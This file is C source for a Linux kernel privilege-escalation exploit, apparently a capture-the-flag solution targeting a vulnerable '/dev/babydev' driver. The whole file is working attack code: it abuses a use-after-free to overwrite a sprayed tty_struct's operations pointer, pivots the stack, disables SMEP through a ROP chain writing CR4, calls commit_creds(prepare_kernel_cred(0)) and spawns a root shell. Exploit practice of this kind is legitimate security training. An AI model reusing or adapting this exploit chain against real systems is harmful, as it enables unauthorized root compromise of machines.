#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <stropts.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <errno.h>
#include <string.h>
#include <linux/tty.h>
#include <sys/ioctl.h>
#include <pty.h>
#include <sys/mman.h>
#include <sys/ipc.h>
#include <sys/sem.h>
#include <sched.h>
#include <sys/socket.h>
#include <sys/syscall.h>

#define IOCTL_CMD 0x10001
#define TTY_STRUCT_SIZE 0x2e0

int spray_fd;

struct tty_operations
{
    struct tty_struct *(*lookup)(struct tty_driver *, struct file *, int); /*     0     8 */
    int (*install)(struct tty_driver *, struct tty_struct *);              /*     8     8 */
    void (*remove)(struct tty_driver *, struct tty_struct *);              /*    16     8 */
    int (*open)(struct tty_struct *, struct file *);                       /*    24     8 */
    void (*close)(struct tty_struct *, struct file *);                     /*    32     8 */
    void (*shutdown)(struct tty_struct *);                                 /*    40     8 */
    void (*cleanup)(struct tty_struct *);                                  /*    48     8 */
    int (*write)(struct tty_struct *, const unsigned char *, int);         /*    56     8 */
    /* --- cacheline 1 boundary (64 bytes) --- */
    int (*put_char)(struct tty_struct *, unsigned char);                            /*    64     8 */
    void (*flush_chars)(struct tty_struct *);                                       /*    72     8 */
    int (*write_room)(struct tty_struct *);                                         /*    80     8 */
    int (*chars_in_buffer)(struct tty_struct *);                                    /*    88     8 */
    int (*ioctl)(struct tty_struct *, unsigned int, long unsigned int);             /*    96     8 */
    long int (*compat_ioctl)(struct tty_struct *, unsigned int, long unsigned int); /*   104     8 */
    void (*set_termios)(struct tty_struct *, struct ktermios *);                    /*   112     8 */
    void (*throttle)(struct tty_struct *);                                          /*   120     8 */
    /* --- cacheline 2 boundary (128 bytes) --- */
    void (*unthrottle)(struct tty_struct *);           /*   128     8 */
    void (*stop)(struct tty_struct *);                 /*   136     8 */
    void (*start)(struct tty_struct *);                /*   144     8 */
    void (*hangup)(struct tty_struct *);               /*   152     8 */
    int (*break_ctl)(struct tty_struct *, int);        /*   160     8 */
    void (*flush_buffer)(struct tty_struct *);         /*   168     8 */
    void (*set_ldisc)(struct tty_struct *);            /*   176     8 */
    void (*wait_until_sent)(struct tty_struct *, int); /*   184     8 */
    /* --- cacheline 3 boundary (192 bytes) --- */
    void (*send_xchar)(struct tty_struct *, char);                           /*   192     8 */
    int (*tiocmget)(struct tty_struct *);                                    /*   200     8 */
    int (*tiocmset)(struct tty_struct *, unsigned int, unsigned int);        /*   208     8 */
    int (*resize)(struct tty_struct *, struct winsize *);                    /*   216     8 */
    int (*set_termiox)(struct tty_struct *, struct termiox *);               /*   224     8 */
    int (*get_icount)(struct tty_struct *, struct serial_icounter_struct *); /*   232     8 */
    const struct file_operations *proc_fops;                                 /*   240     8 */

    /* size: 248, cachelines: 4, members: 31 */
    /* last cacheline: 56 bytes */
};


typedef int __attribute__((regparm(3)))(*commit_creds_func)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (*prepare_kernel_cred_func)(unsigned long cred);

commit_creds_func commit_creds = (commit_creds_func) 0xffffffff810a1420;
prepare_kernel_cred_func prepare_kernel_cred = (prepare_kernel_cred_func) 0xffffffff810a1810;

unsigned long setcr4 = 0xffffffff810635b0;
unsigned long poprdi = 0xffffffff813e7d6f; 
unsigned long swapgs_poprbp = 0xffffffff81063694; 
unsigned long xchgespeax = 0xffffffff81007808;
unsigned long iretq = 0xffffffff814e35ef;

void get_shell(){
	printf("[+] Shell with root privilages!\n");
	char *args[] = {"/bin/sh", NULL};
	execve("/bin/sh", args , NULL);
}

void shellcode(){
	commit_creds(prepare_kernel_cred(0));
}
unsigned long user_cs, user_ss, user_rflags;
static void save_state()
{
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "pushfq\n"
        "popq %2\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags)
        :
        : "memory");
}

void set_affinity(int which_cpu)
{
    cpu_set_t cpu_set;
    CPU_ZERO(&cpu_set);
    CPU_SET(which_cpu, &cpu_set);
    if (sched_setaffinity(0, sizeof(cpu_set), &cpu_set) != 0)
    {
        perror("sched_setaffinity()");
        exit(EXIT_FAILURE);
    }
}

void exploit(){
	int fd1=open("/dev/babydev",O_RDWR);	
	int fd2=open("/dev/babydev",O_RDWR);	
	char *buf=(char *)malloc(0x1000);
	char *fake_file_operations=(char *)calloc(0x1000,1);
	struct tty_operations *fake_tty_operations = (struct tty_operations *)malloc(sizeof(struct tty_operations));
	save_state();
	//set_affinity(0);
	memset(fake_tty_operations,0,sizeof(struct tty_operations));
	fake_tty_operations->proc_fops=&fake_file_operations;
	fake_tty_operations->ioctl=(unsigned long)xchgespeax;
	ioctl(fd1,IOCTL_CMD,TTY_STRUCT_SIZE);
	close(fd1);
	int fd=fd2;
	spray_fd=open("/dev/ptmx",O_RDWR | O_NOCTTY);
	if(spray_fd<0){
		perror("open tty");
	}
	read(fd,buf,32);
	if(buf[0]!=0x1 || buf[1]!=0x54){
		puts("[-] tty_struct spray failed!");
		exit(-1);
	}
	unsigned long *temp=(unsigned long *)&buf[24];
	*temp=(unsigned long)fake_tty_operations;
	unsigned long lower_address=xchgespeax & 0xffffffff;
	unsigned long base=lower_address & ~0xfff;
	printf("[+] Base address = %#lx\n",base);	
	if(mmap((void *)base,0x30000,7,MAP_PRIVATE|MAP_ANONYMOUS,-1,0)!=base){
		perror("mmap");
		exit(-1);
	}

	unsigned long rop_chain[]={
		poprdi,0x6f0,setcr4,(unsigned long)shellcode,swapgs_poprbp,0,iretq,(unsigned long)get_shell,user_cs,user_rflags,base+0x10000,
		user_ss
	};
/*
	unsigned long rop_chain[]={
		poprdi,0x6f0,setcr4,(unsigned long)shellcode,swapgs_poprbp,0,(unsigned long)get_shell,user_cs,user_rflags,base+0x10000,
		user_ss
	};
*/
	memcpy((void *)lower_address,rop_chain,sizeof(rop_chain));
	puts("[+] Writing function pointer to driver");
	long len=write(fd,buf,32);
	if(len<0){
		perror("write");
		exit(1);
	}
	puts("[+] Triggering");
	ioctl(spray_fd,0,0);
}
int main(){
	exploit();
	return 0;
}
